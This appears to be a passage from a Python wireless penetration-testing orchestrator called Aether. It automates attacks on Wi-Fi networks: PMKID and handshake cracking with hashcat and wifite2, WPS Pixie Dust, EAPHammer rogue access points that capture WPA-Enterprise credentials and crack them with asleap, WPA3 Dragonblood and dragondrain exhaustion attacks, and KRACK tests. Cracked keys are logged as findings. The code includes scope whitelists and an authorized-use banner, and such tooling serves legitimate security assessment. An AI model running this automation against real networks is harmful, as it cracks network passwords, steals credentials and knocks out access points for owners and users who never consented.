        if not stage_wl or not os.path.exists(stage_wl):
            continue
        hc_cmd = [
            "hashcat", "-m", "22000",
            "--potfile-path", str(pmkid_dir / "hashcat.potfile"),
            "--status", "--status-timer", "30",
            str(hc22000_file), stage_wl,
        ]
        if stage_rule:
            hc_cmd += ["-r", stage_rule]
            log(f"[1a] hashcat: stage with rule {Path(stage_rule).name}")
        else:
            log(f"[1a] hashcat: stage — wordlist only")
        hc_out, _ = _run(hc_cmd, timeout=600)
        # Extract cracked results from potfile
        potfile = pmkid_dir / "hashcat.potfile"
        if potfile.exists():
            for pot_line in potfile.read_text(encoding="utf-8").splitlines():
                if ":" in pot_line:
                    psk = pot_line.rsplit(":", 1)[-1]
                    # Find matching SSID from hash line
                    for hl in hash_lines:
                        parts = hl.split("*")
                        if len(parts) >= 4 and pot_line.split(":")[0] in hl:
                            try:
                                ssid_crack = bytes.fromhex(parts[3]).decode("utf-8", errors="replace")
                            except Exception:
                                ssid_crack = "unknown"
                            finding_from_cat(
                                "AETHER-001",
                                data={"ssid": ssid_crack, "psk": psk,
                                      "attack": "PMKID + hashcat"},
                                output_file=str(hc22000_file),
                                title_override=f"WPA PSK Cracked via PMKID: {ssid_crack}",
                            )
                            break

    status("p1a_pmkid", "Phase 1a: PMKID Capture", "complete")


# ── Phase 1b: wifite2 — WPA/WPA2/WPA3 handshake + WPS ───────────────────────
# wifite2 — originally derv82, actively maintained by kimocoder

def phase_wifite(
    monitor_iface: str,
    target_ssids: list,
    target_bssids: list,
    wordlist: str | None,
    output_dir: Path,
    timeout: int = 300,
) -> None:
    """
    Phase 1b: wifite2 automated WPA/WPA2/WPA3 handshake + WPS attacks.
    Uses the SSID-seeded wordlist (mutations from SSID name merged with the
    base wordlist) to improve cracking success rates over wordlist alone.
    """
    wifite_path = shutil.which("wifite") or shutil.which("wifite2")
    if not wifite_path:
        log("[~] wifite2 not installed — skipping Phase 1b")
        status("p1b_wifite", "Phase 1b: WPA Handshake + WPS", "skipped",
               "wifite2 not installed")
        return

    status("p1b_wifite", "Phase 1b: WPA Handshake + WPS", "running")
    wifite_dir = output_dir / "wifite"
    wifite_dir.mkdir(parents=True, exist_ok=True)

    cmd = [
        "sudo", wifite_path,
        "--kill",
        "--wpa",
        "--wps",
        "--pmkid",
        "--interface", monitor_iface,
        "--timeout", str(min(timeout, 60)),
        "--crack-handshake",
    ]

    def _parse_output(out_lines: list[str], ssid: str, out_file: Path) -> None:
        seen: set[str] = set()
        for line in out_lines:
            if re.search(r'WPA.*?key.*?:.*?\S|Cracked|password', line, re.I):
                m = re.search(r'(?:key|password)[:\s]+(\S+)', line, re.I)
                psk   = m.group(1) if m else "(see output)"
                title = f"WPA Pre-Shared Key Cracked: {ssid}"
                if title not in seen:
                    seen.add(title)
                    finding_from_cat(
                        "AETHER-001",
                        data={"ssid": ssid, "psk": psk, "attack": "wifite2"},
                        output_file=str(out_file),
                        title_override=title,
                    )
            if re.search(r'handshake|PMKID|\.hc22000', line, re.I):
                title = f"WPA Handshake / PMKID Captured: {ssid}"
                if title not in seen:
                    seen.add(title)
                    finding_from_cat(
                        "AETHER-002",
                        data={"ssid": ssid},
                        output_file=str(out_file),
                        title_override=title,
                    )
            if re.search(r'WPS.*?pin|pixie.*?dust|wps.*?cracked', line, re.I):
                title = f"WPS PIN / Pixie Dust Succeeded: {ssid}"
                if title not in seen:
                    seen.add(title)
                    finding(
                        title=title,
                        severity="CRITICAL",
                        description=(
                            f"wifite2 cracked WPS on '{ssid}' via Pixie Dust or PIN "
                            f"brute-force. The AP's WPS is vulnerable and the full "
                            f"WPA2 key is exposed."
                        ),
                        data={"ssid": ssid},
                        output_file=str(out_file),
                        cvss_score=8.8,
                        cvss_vector="AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
                    )

    def _run_wifite(extra_args: list, out_file: Path, label: str,
                    merged_wl: str | None) -> None:
        _cmd = cmd[:]
        if merged_wl and os.path.exists(merged_wl):
            _cmd += ["--dict", merged_wl]
        _cmd += extra_args
        try:
            proc = _popen(_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                          cwd=str(wifite_dir))
            if proc.stdout is None:
                raise RuntimeError("wifite2 stdout unavailable")
            out_lines: list[str] = []
            deadline = time.time() + timeout + 30
            while True:
                line = _readline_timed(proc.stdout, deadline)
                if line is None:
                    break
                decoded = line.decode("utf-8", errors="replace").rstrip()
                log(decoded)
                out_lines.append(decoded)
            _kill_proc(proc, wait_secs=10)
            out_file.write_text("\n".join(out_lines), encoding="utf-8")
            _parse_output(out_lines, label, out_file)
        except Exception as exc:
            err(f"wifite2 error ({label}): {exc}")

    if target_ssids:
        for ssid in target_ssids:
            merged_wl = _generate_ssid_wordlist(ssid, wordlist)
            extra = ["--essid", ssid]
            if target_bssids:
                extra += ["--bssid", target_bssids[0]]
            safe = re.sub(r'[^\w]', '_', ssid)
            log(f"[1b] wifite2: targeting '{ssid}'")
            _run_wifite(extra, wifite_dir / f"wifite_{safe}.txt", ssid, merged_wl)
            # Clean up temp wordlist
            if merged_wl and merged_wl != wordlist and os.path.exists(merged_wl):
                try:
                    os.unlink(merged_wl)
                except Exception:
                    pass
    else:
        log("[1b] wifite2: scanning all visible networks")
        _run_wifite([], wifite_dir / "wifite_all.txt", "(all networks)", wordlist)

    status("p1b_wifite", "Phase 1b: WPA Handshake + WPS", "complete")


# ── Phase 2: EAPHammer — WPA-Enterprise + asleap cracking ────────────────────
# EAPHammer — by s0lst1c3 (https://github.com/s0lst1c3/eaphammer)

def phase_eaphammer(
    monitor_iface: str, target_aps: list[dict],
    eaphammer_path: str, output_dir: Path,
    auth: str = "wpa-eap", timeout: int = 300,
    asleap_path: str = "",
) -> None:
    """
    Phase 2: EAPHammer rogue AP + optional asleap offline cracking.
    After EAPHammer captures MSCHAPv2 challenge/response, asleap is run
    against the credential files to attempt offline dictionary-based cracking.
    """
    if not os.path.exists(eaphammer_path):
        log(f"[~] EAPHammer not found at {eaphammer_path} — skipping Phase 2")
        status("p2_eaphammer", "Phase 2: WPA-Enterprise Attack", "skipped",
               "not installed")
        return

    status("p2_eaphammer", "Phase 2: WPA-Enterprise Attack", "running")
    eap_dir = output_dir / "eaphammer"
    eap_dir.mkdir(parents=True, exist_ok=True)

    enterprise_aps = [
        ap for ap in target_aps
        if _in_scope(ap)
        and re.search(r'WPA.*EAP|Enterprise|802\.1X', ap.get("encryption", ""), re.I)
    ]
    if not enterprise_aps and target_aps:
        enterprise_aps = [ap for ap in target_aps[:3] if _in_scope(ap)]
    if not enterprise_aps:
        log("[~] EAPHammer: no WPA-Enterprise targets — skipping")
        status("p2_eaphammer", "Phase 2: WPA-Enterprise Attack", "skipped",
               "no enterprise targets")
        return

    # Resolve asleap binary
    _asleap = (asleap_path if asleap_path and os.path.exists(asleap_path)
               else shutil.which("asleap") or "")

    for ap in enterprise_aps[:3]:
        ssid    = ap.get("ssid", "")
        bssid   = ap.get("bssid", "")
        channel = ap.get("channel", 6)
        if not ssid:
            continue

        cred_dir = eap_dir / re.sub(r'[^\w]', '_', ssid)
        cred_dir.mkdir(parents=True, exist_ok=True)
        out_file = eap_dir / f"eaphammer_{re.sub(r'[^\w]', '_', ssid)}.txt"

        cmd = [
            "sudo", "python3", eaphammer_path,
            "--interface", monitor_iface,
            "--channel", str(channel),
            "--essid", ssid,
            "--auth", auth,
            "--creds", "--creds-output", str(cred_dir),
        ]
        if bssid:
            cmd += ["--bssid", bssid]

        log(f"[2] EAPHammer: rogue AP '{ssid}' ch={channel} auth={auth}")
        cred_found = False
        try:
            proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            if proc.stdout is None:
                raise RuntimeError("EAPHammer stdout unavailable")
            out_lines: list[str] = []
            deadline = time.time() + timeout
            while True:
                line = _readline_timed(proc.stdout, deadline)
                if line is None:
                    break
                decoded = line.decode("utf-8", errors="replace").rstrip()
                log(decoded)
                out_lines.append(decoded)
                if not cred_found and re.search(
                    r'challenge|response|MSCHAPv2|username|password', decoded, re.I
                ):
                    cred_found = True
                    finding_from_cat(
                        "AETHER-003",
                        data={"ssid": ssid, "bssid": bssid, "auth": auth,
                              "creds_dir": str(cred_dir)},
                        output_file=str(cred_dir),
                        title_override=f"WPA-Enterprise Credentials Captured: {ssid}",
                    )
            _kill_proc(proc)
            out_file.write_text("\n".join(out_lines), encoding="utf-8")
        except Exception as exc:
            err(f"EAPHammer error: {exc}")
            continue

        # asleap post-processing: attempt offline MSCHAPv2 cracking
        if cred_found and _asleap:
            _run_asleap(_asleap, cred_dir, ssid, out_file)

    status("p2_eaphammer", "Phase 2: WPA-Enterprise Attack", "complete")


def _run_asleap(asleap_bin: str, cred_dir: Path, ssid: str,
                out_file: Path) -> None:
    """Run asleap against EAPHammer-captured NetNTLMv2/MSCHAPv2 hash files."""
    # EAPHammer writes challenge:response or .netntlm files in cred_dir
    hash_files = (
        list(cred_dir.glob("*.netntlm")) +
        list(cred_dir.glob("*.txt")) +
        list(cred_dir.glob("creds-*"))
    )
    if not hash_files:
        return
    for hf in hash_files[:3]:
        content = hf.read_text(encoding="utf-8", errors="replace")
        # Look for challenge:response format used by asleap
        m = re.search(
            r'(?:challenge|chall)[:\s]+([0-9a-fA-F]+).*?'
            r'(?:response|resp)[:\s]+([0-9a-fA-F]+)',
            content, re.I | re.DOTALL,
        )
        if not m:
            continue
        challenge = m.group(1)
        response  = m.group(2)
        log(f"[2] asleap: cracking MSCHAPv2 hash for {ssid!r}")
        asleap_out, _ = _run([
            asleap_bin,
            "-C", challenge,
            "-R", response,
        ], timeout=120)
        log(asleap_out)
        pw_m = re.search(r'(?:password|passwd|pw)[:\s]+(\S+)', asleap_out, re.I)
        if pw_m:
            finding_from_cat(
                "AETHER-018",
                data={"ssid": ssid, "password": pw_m.group(1),
                      "hash_file": str(hf)},
                output_file=str(out_file),
                title_override=f"MSCHAPv2 Cracked via asleap: {ssid}",
            )


# ── Phase 3: dragonslayer — WPA3 SAE cryptographic testing ───────────────────
# dragonslayer — by Mathy Vanhoef @vanhoefm (https://github.com/vanhoefm/dragonslayer)

_DRAGON_MODE: dict[int, tuple[str, list[str]]] = {
    0: ("AETHER-005", ["CVE-2019-9494"]),
    1: ("AETHER-004", ["CVE-2019-9494", "CVE-2019-9495"]),
    2: ("AETHER-006", ["CVE-2019-9495", "CVE-2019-9497", "CVE-2019-9498", "CVE-2019-9499"]),
    3: ("AETHER-007", ["CVE-2019-9500", "CVE-2019-9501", "CVE-2019-9502"]),
}


def phase_dragonslayer(
    monitor_iface: str, target_aps: list[dict],
    dragonslayer_client: str, output_dir: Path,
    attack: int = 1, client_conf: str = "", timeout: int = 180,
) -> None:
    if not os.path.exists(dragonslayer_client):
        log(f"[~] dragonslayer not found at {dragonslayer_client} — skipping Phase 3")
        status("p3_dragonslayer", "Phase 3: WPA3 SAE Testing", "skipped", "not installed")
        return

    status("p3_dragonslayer", "Phase 3: WPA3 SAE Testing", "running")
    ds_dir = output_dir / "dragonslayer"
    ds_dir.mkdir(parents=True, exist_ok=True)

    cat_id, cves = _DRAGON_MODE.get(attack, ("AETHER-004", ["CVE-2019-9494"]))

    wpa3_aps = [
        ap for ap in target_aps
        if _in_scope(ap) and re.search(r'WPA3|SAE', ap.get("encryption", ""), re.I)
    ]
    if not wpa3_aps:
        log("[~] dragonslayer: no WPA3/SAE targets — running against all in-scope targets")
        wpa3_aps = [ap for ap in target_aps[:3] if _in_scope(ap)]

    for ap in wpa3_aps[:3]:
        ssid      = ap.get("ssid", "unknown")
        safe_ssid = re.sub(r'[^\w]', '_', ssid)
        out_file  = ds_dir / f"dragonslayer_{safe_ssid}_attack{attack}.txt"

        conf_content = (
            f'network={{\n    ssid="{ssid}"\n    key_mgmt=SAE\n    sae_groups=19\n}}\n'
        )
        target_conf = str(ds_dir / f"client_{safe_ssid}.conf")
        try:
            with open(target_conf, "w") as cf:
                cf.write(conf_content)
        except Exception:
            target_conf = client_conf

        cmd = ["sudo", "bash", dragonslayer_client,
               "-i", monitor_iface, "-a", str(attack)]
        if target_conf:
            cmd += ["-c", target_conf]

        log(f"[3] dragonslayer: mode {attack} ({', '.join(cves)}) → '{ssid}'")
        try:
            proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                          cwd=str(os.path.dirname(dragonslayer_client)))
            if proc.stdout is None:
                raise RuntimeError("dragonslayer stdout unavailable")
            out_lines: list[str] = []
            deadline = time.time() + timeout
            while True:
                line = _readline_timed(proc.stdout, deadline)
                if line is None:
                    break
                decoded = line.decode("utf-8", errors="replace").rstrip()
                log(decoded)
                out_lines.append(decoded)
                if re.search(
                    r'vulnerable|attack succeed|reflection|invalid curve|zero.scalar',
                    decoded, re.I,
                ):
                    finding_from_cat(
                        cat_id,
                        data={"ssid": ssid, "attack_mode": attack, "cves": cves},
                        output_file=str(out_file),
                        title_override=f"WPA3 SAE Dragonblood Mode {attack}: {ssid}",
                    )
            _kill_proc(proc)
            out_file.write_text("\n".join(out_lines), encoding="utf-8")
        except Exception as exc:
            err(f"dragonslayer error: {exc}")

    status("p3_dragonslayer", "Phase 3: WPA3 SAE Testing", "complete")


# ── Phase 4: dragondrain — WPA3 SAE resource exhaustion ──────────────────────

def phase_dragondrain(
    monitor_iface: str, target_aps: list[dict],
    dragondrain_path: str, output_dir: Path,
    timeout: int = 60,
) -> None:
    """Finding only emitted when tool output explicitly reports AP exhaustion."""
    if not os.path.exists(dragondrain_path):
        log(f"[~] dragondrain not found — skipping Phase 4")
        status("p4_dragondrain", "Phase 4: WPA3 Resource Exhaustion", "skipped",
               "not installed")
        return

    status("p4_dragondrain", "Phase 4: WPA3 Resource Exhaustion", "running")
    drain_dir = output_dir / "dragondrain"
    drain_dir.mkdir(parents=True, exist_ok=True)

    for ap in [ap for ap in target_aps[:3] if _in_scope(ap)]:
        ssid    = ap.get("ssid", "")
        bssid   = ap.get("bssid", "")
        channel = ap.get("channel", 6)
        if not bssid:
            continue
        safe     = re.sub(r'[^\w]', '_', ssid or bssid)
        out_file = drain_dir / f"dragondrain_{safe}.txt"
        cmd = [
            "sudo", dragondrain_path,
            "-d", monitor_iface, "-a", bssid, "-c", str(channel),
            "-n", "10", "-r", "20", "-g", "21",
        ]
        log(f"[4] dragondrain: {ssid!r} [{bssid}]")
        try:
            proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            if proc.stdout is None:
                raise RuntimeError("dragondrain stdout unavailable")
            out_lines: list[str] = []
            deadline  = time.time() + timeout
            confirmed = False
            while True:
                line = _readline_timed(proc.stdout, deadline)
                if line is None:
                    break
                decoded = line.decode("utf-8", errors="replace").rstrip()
                log(decoded)
                out_lines.append(decoded)
                if re.search(
                    r'exhausted|overflow|cpu|saturated|timed?\s*out|no\s*response',
                    decoded, re.I,
                ):
                    confirmed = True
            _kill_proc(proc)
            out_file.write_text("\n".join(out_lines), encoding="utf-8")
            if confirmed:
                finding_from_cat(
                    "AETHER-008",
                    data={"ssid": ssid, "bssid": bssid},
                    output_file=str(out_file),
                    title_override=f"WPA3 SAE Resource Exhaustion Confirmed: {ssid}",
                )
            else:
                log(f"[4] dragondrain: no exhaustion indicators for {ssid!r}")
        except Exception as exc:
            err(f"dragondrain error: {exc}")

    status("p4_dragondrain", "Phase 4: WPA3 Resource Exhaustion", "complete")


# ── Phase 5: krackattacks — WPA2 KRACK key reinstallation testing ─────────────

def phase_krack(
    monitor_iface: str, target_aps: list[dict],
    krackattacks_path: str, output_dir: Path,
    timeout: int = 180,
) -> None:
    if not os.path.exists(krackattacks_path):
        log(f"[~] krackattacks-scripts not found — skipping Phase 5")
        status("p5_krack", "Phase 5: KRACK Testing", "skipped", "not installed")
        return

    status("p5_krack", "Phase 5: KRACK Testing", "running")
    krack_dir = output_dir / "krack"
    krack_dir.mkdir(parents=True, exist_ok=True)

    hwcrypto = os.path.join(os.path.dirname(krackattacks_path),
                             "disable-hwcrypto.sh")
    if os.path.exists(hwcrypto):
        log("[5] Disabling hardware crypto...")
        _run(["sudo", "bash", hwcrypto])

    test_variants = [
        ([],           "standard 4-way", "CVE-2017-13077", "AETHER-009"),
        (["--group"],  "group key",      "CVE-2017-13080", "AETHER-011"),
        (["--tptk"],   "TPTK variant",   "CVE-2017-13078", "AETHER-010"),
    ]

    for ap in [ap for ap in target_aps[:3] if _in_scope(ap)]:
        ssid  = ap.get("ssid", "")
        bssid = ap.get("bssid", "")
        if not bssid:
            continue
        safe = re.sub(r'[^\w]', '_', ssid or bssid)

        for flags, variant, cve, cat_id in test_variants:
            out_file = krack_dir / f"krack_{safe}_{variant.replace(' ', '_')}.txt"
            cmd = (["sudo", "python3", krackattacks_path]
                   + flags + ["--bssid", bssid])
            log(f"[5] KRACK {variant} ({cve}) → '{ssid}'")
            try:
                proc = _popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                              cwd=str(os.path.dirname(krackattacks_path)))
                if proc.stdout is None:
                    raise RuntimeError("krackattacks stdout unavailable")
                out_lines: list[str] = []
                deadline = time.time() + timeout
                while True:
                    line = _readline_timed(proc.stdout, deadline)
                    if line is None:
                        break
                    decoded = line.decode("utf-8", errors="replace").rstrip()
                    log(decoded)
                    out_lines.append(decoded)
                    if re.search(r'VULNERABLE|reinstalled|attack worked', decoded, re.I):
                        finding_from_cat(
                            cat_id,
                            data={"ssid": ssid, "bssid": bssid,
                                  "cve": cve, "variant": variant},
                            output_file=str(out_file),
                            title_override=f"WPA2 KRACK {variant.title()} ({cve}): {ssid}",
                        )
                _kill_proc(proc)
                out_file.write_text("\n".join(out_lines), encoding="utf-8")
            except Exception as exc:
                err(f"KRACK {variant} error: {exc}")

    status("p5_krack", "Phase 5: KRACK Testing", "complete")


# ── Main orchestrator ─────────────────────────────────────────────────────────

def run(config: dict, project: str) -> None:
    global _scope_bssids, _scope_ssids

    output_dir = Path(project) / config.get("output_dir", "aether_output")
    output_dir.mkdir(parents=True, exist_ok=True)

    interface     = config.get("interface", "wlan0")
    monitor_iface = config.get("monitor_interface", "wlan0mon")
    target_ssids  = config.get("target_ssids", [])
    target_bssids = config.get("target_bssids", [])
    wordlist      = config.get("wordlist")
    domains       = config.get("domains", [])
    phases_cfg    = config.get("phases", {})
    tools         = config.get("tools", {})
    timeout       = config.get("timeout_per_phase", 300)
    scan_channel  = config.get("scan_channel")
    hashcat_rules = config.get("hashcat_rules", [])
    asleap_path   = config.get("asleap_path", "")

    # Scope enforcement
    scope_cfg    = config.get("scope", {})
    _scope_bssids = {b.upper() for b in scope_cfg.get("bssids", [])}
    _scope_ssids  = set(scope_cfg.get("ssids", []))
    if _scope_bssids or _scope_ssids:
        log(f"Scope: {len(_scope_bssids)} BSSID(s), {len(_scope_ssids)} SSID(s) in whitelist")

    log("=" * 60)
    log("AUTHORIZED USE ONLY. Explicit written permission from the")
    log("network owner is required before any wireless assessment.")
    log("=" * 60)
    log(f"Aether Wireless Penetration Testing Orchestrator v{VERSION}")
    log(f"Project  : {project}")
    log(f"Interface: {interface}")
    log(f"Targets  : {', '.join(target_ssids) if target_ssids else '(all in-scope)'}")
    log("=" * 60)

    _check_privileges()
    if not _check_interface(interface):
        err(f"Aborting: interface '{interface}' not available.")
        return

    # Build domain-derived wordlist (merged with base wordlist) before phases start
    _effective_wl = _build_domain_wordlist(domains, wordlist)
    if _effective_wl and _effective_wl != wordlist:
        log(f"Domain wordlist active: {_effective_wl}")

    active_monitor = enable_monitor_mode(interface, monitor_iface)

    try:
        _check_injection(active_monitor)

        target_aps = scan_targets(
            active_monitor, target_ssids, target_bssids,
            timeout=30, channel=scan_channel,
        )

        if phases_cfg.get("wep", True):
            phase_wep(active_monitor, target_aps, output_dir, timeout)

        if phases_cfg.get("pmkid", True):
            phase_pmkid(active_monitor, target_aps, output_dir,
                        timeout=min(timeout, 120), wordlist=_effective_wl,
                        hashcat_rules=hashcat_rules)

        if phases_cfg.get("wpa_handshake", True):
            phase_wifite(
                active_monitor, target_ssids, target_bssids,
                _effective_wl, output_dir, timeout,
            )

        if phases_cfg.get("wpa_enterprise", False):
            phase_eaphammer(
                active_monitor, target_aps,
                tools.get("eaphammer", "/opt/eaphammer/eaphammer"),
                output_dir,
                auth=config.get("eaphammer", {}).get("auth", "wpa-eap"),
                timeout=timeout,
                asleap_path=asleap_path,
            )

        if phases_cfg.get("dragonblood_sae", True):
            ds_cfg = config.get("dragonslayer", {})
            phase_dragonslayer(
                active_monitor, target_aps,
                tools.get("dragonslayer_client",
                           "/opt/dragonslayer/dragonslayer-client.sh"),
                output_dir,
                attack=ds_cfg.get("attack", 1),
                client_conf=ds_cfg.get("client_conf", ""),
                timeout=timeout,
            )

        if phases_cfg.get("dragonblood_drain", False):
            phase_dragondrain(
                active_monitor, target_aps,
                tools.get("dragondrain",
                           "/opt/dragondrain-and-time/dragondrain"),
                output_dir, timeout=60,
            )

        if phases_cfg.get("krack", True):
            phase_krack(
                active_monitor, target_aps,
                tools.get("krackattacks",
                           "/opt/krackattacks-scripts/krackattack/krack-test-client.py"),
                output_dir, timeout=timeout,
            )

    finally:
        disable_monitor_mode(active_monitor, interface)
        # Clean up domain-derived temp wordlist
        if _effective_wl and _effective_wl != wordlist:
            try:
                os.unlink(_effective_wl)
            except Exception:
                pass

    save_findings(output_dir)

    meta = {
        "version": VERSION,
        "project": project,
        "interface": interface,
        "target_ssids": target_ssids,
        "target_bssids": target_bssids,
        "scope": scope_cfg,
        "phases_run": phases_cfg,
        "output_dir": str(output_dir),
        "completed_at": datetime.now().isoformat(),
        "findings_count": len(_findings_collected),
    }
    (output_dir / "assessment_meta.json").write_text(
        json.dumps(meta, indent=2), encoding="utf-8"
    )
    log(f"Assessment complete — output: {output_dir}")
    status("complete", "Assessment Complete", "complete", str(output_dir))


# ── CLI ───────────────────────────────────────────────────────────────────────

def parse_args():
    _default_cfg     = str(Path(__file__).parent / "config.json")
    _default_project = ""  # computed at runtime from config fields

    parser = argparse.ArgumentParser(
        prog="aether",
        description="Aether — Wireless Penetration Testing Orchestrator",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 aether.py --config config.json --project my_pentest
  python3 aether.py --phase pmkid --interface wlan1 --project quick_test
  python3 aether.py --list-phases
""",
    )
    parser.add_argument("--config", "-c", default=_default_cfg,
                        help="JSON config file (default: next to aether.py)")
    parser.add_argument("--project", "-p", default=_default_project,
                        help="Project name / output root directory")
    parser.add_argument("--interface", "-i",
                        help="Wireless interface (overrides config)")
    parser.add_argument("--phase",
                        choices=["wep", "pmkid", "wpa", "enterprise",
                                 "wpa3", "drain", "krack"],
                        help="Run a single phase only")
    parser.add_argument("--ssid", action="append", dest="ssids", metavar="SSID",
                        help="Target SSID (repeatable; overrides config)")
    parser.add_argument("--bssid", action="append", dest="bssids", metavar="BSSID",
                        help="Target BSSID (repeatable; overrides config)")
    parser.add_argument("--channel", "-C", type=int,
                        help="Lock scan to this channel")
    parser.add_argument("--timeout", "-t", type=int,
                        help="Per-phase timeout seconds")
    parser.add_argument("--wordlist", "-w",
                        help="Wordlist for WPA cracking")
    parser.add_argument("--scope-bssid", action="append", dest="scope_bssids",
                        metavar="BSSID",
                        help="Scope whitelist BSSID (repeatable); attacks blocked outside scope")
    parser.add_argument("--scope-ssid", action="append", dest="scope_ssids",
                        metavar="SSID",
                        help="Scope whitelist SSID (repeatable)")
    parser.add_argument("--domain", action="append", dest="domains",
                        metavar="DOMAIN",
                        help="Domain to deep-parse into wordlist entries (repeatable); "
                             "merged with base wordlist for all password phases")
    parser.add_argument("--rules", action="append", dest="hashcat_rules",
                        metavar="RULE_FILE",
                        help="Hashcat rule file for staged PMKID cracking (repeatable)")
    parser.add_argument("--list-phases", action="store_true",
                        help="List available phases and exit")
    return parser.parse_args()


def _startup_tool_check() -> None:
    """Warn about missing tools at startup. On Linux, exits if the
    core aircrack-ng suite is missing since no phases can run without it."""
    if platform.system() != "Linux":
        return  # macOS support is limited — skip full check
    CRITICAL = ["airmon-ng", "airodump-ng", "aircrack-ng", "aireplay-ng"]
    IMPORTANT = ["hcxdumptool", "hcxpcapngtool", "hashcat", "wash", "asleap"]
    missing_critical  = [t for t in CRITICAL  if not shutil.which(t)]
    missing_important = [t for t in IMPORTANT if not shutil.which(t)]
    if missing_critical or missing_important:
        print("[!] Aether startup tool check:", file=sys.stderr)
    for t in missing_critical:
        print(f"    MISSING (critical) : {t}  — install aircrack-ng suite",
              file=sys.stderr)
    for t in missing_important:
        print(f"    MISSING (important): {t}  — run: sudo python3 install.py",
              file=sys.stderr)
    if missing_critical:
        print("[!] Cannot continue without the aircrack-ng suite.\n", file=sys.stderr)
        sys.exit(1)


def main():
    args = parse_args()

    if args.list_phases:
        print("Available phases:")
        print("  wep        — Phase 0:  WEP IV capture + PTW crack     (aircrack-ng)")
        print("  pmkid      — Phase 1a: Clientless PMKID + hashcat      (hcxdumptool)")
        print("  wpa        — Phase 1b: WPA handshake + WPS attacks     (wifite2)")
        print("  enterprise — Phase 2:  WPA-Enterprise rogue AP + asleap(EAPHammer)")
        print("  wpa3       — Phase 3:  WPA3 SAE crypto testing         (dragonslayer)")
        print("  drain      — Phase 4:  WPA3 resource exhaustion        (dragondrain)")
        print("  krack      — Phase 5:  WPA2 KRACK testing              (krackattacks)")
        sys.exit(0)

    _startup_tool_check()

    config_path = Path(args.config)
    if not config_path.exists():
        print(f"[!] Config not found: {config_path}", file=sys.stderr)
        sys.exit(1)
    try:
        config = json.loads(config_path.read_text(encoding="utf-8"))
    except json.JSONDecodeError as exc:
        print(f"[!] Config parse error: {exc}", file=sys.stderr)
        sys.exit(1)

    # Resolve project directory: CLI arg → absolute; relative → under clients_base;
    # omitted → structured path from config's client_short and start_date fields.
    import re as _re
    if args.project:
        _pp = Path(args.project)
        args.project = str(_pp if _pp.is_absolute() else _clients_base() / _pp)
    else:
        _cs = (config.get("client_short") or "").strip()
        _sd = (config.get("start_date") or "").strip()
        # Use tool-specific name from TOOLS registry if this is a variant (aether-z, etc.)
        _tool_key = os.environ.get("SPECTRE_TOOL_ID", "aether")
        args.project = str(_build_project_dir(_cs, _sd, _tool_key))
    _write_project_meta(
        Path(args.project),
        tool=os.environ.get("SPECTRE_TOOL_ID", "aether"),
        client_short=(config.get("client_short") or ""),
        year=((config.get("start_date") or "")[:4] or datetime.now().strftime("%Y")),
        version=VERSION,
    )

    if args.interface:
        config["interface"] = args.interface
    if args.ssids:
        config["target_ssids"] = args.ssids
    if args.bssids:
        config["target_bssids"] = args.bssids
    if args.channel is not None:
        config["scan_channel"] = args.channel
    if args.timeout is not None:
        config["timeout_per_phase"] = args.timeout
    if args.wordlist:
        config["wordlist"] = args.wordlist
    if args.scope_bssids:
        config.setdefault("scope", {})["bssids"] = args.scope_bssids
    if args.scope_ssids:
        config.setdefault("scope", {})["ssids"] = args.scope_ssids
    if args.domains:
        config["domains"] = args.domains
    if args.hashcat_rules:
        config["hashcat_rules"] = args.hashcat_rules

    if args.phase:
        _phase_map = {
            "wep":        "wep",
            "pmkid":      "pmkid",
            "wpa":        "wpa_handshake",
            "enterprise": "wpa_enterprise",
            "wpa3":       "dragonblood_sae",
            "drain":      "dragonblood_drain",
            "krack":      "krack",
        }
        _all_keys = [
            "wep", "pmkid", "wpa_handshake", "wpa_enterprise",
            "dragonblood_sae", "dragonblood_drain", "krack",
        ]
        config["phases"] = {k: (k == _phase_map[args.phase]) for k in _all_keys}

    _load_catalogue()
    run(config, args.project)


_load_catalogue()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log("Assessment interrupted by operator.")
        sys.exit(0)
